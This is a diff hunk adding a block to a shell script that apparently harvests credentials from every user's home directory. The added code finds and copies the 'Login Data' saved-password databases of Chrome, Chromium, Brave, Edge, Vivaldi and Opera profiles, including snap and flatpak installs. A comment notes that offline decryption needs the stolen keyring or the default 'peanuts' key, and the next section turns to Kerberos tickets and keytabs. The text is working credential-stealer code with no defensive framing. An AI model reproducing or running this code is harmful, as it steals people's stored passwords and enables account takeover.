@@ -135,6 +135,20 @@ for h in $HOMES; do
                 while IFS= read -r ff; do cp_one "$ff"; done
         done
     done
+    # chromium-family profiles (saved logins db). Decrypt offline needs the
+    # keyring (grabbed above) or the basic-store "peanuts" key.
+    for b in .config/google-chrome .config/chromium \
+             ".config/BraveSoftware/Brave-Browser" .config/microsoft-edge \
+             .config/vivaldi .config/opera \
+             snap/chromium/common/chromium \
+             ".var/app/com.google.Chrome/config/google-chrome" \
+             ".var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser"; do
+        [ -d "$h/$b" ] || continue
+        for f in "Login Data" "Login Data For Account"; do
+            find "$h/$b" -maxdepth 3 -name "$f" 2>/dev/null | \
+                while IFS= read -r ff; do cp_one "$ff"; done
+        done
+    done
 done
 
 # ================= KERBEROS TICKETS / KEYTABS =================
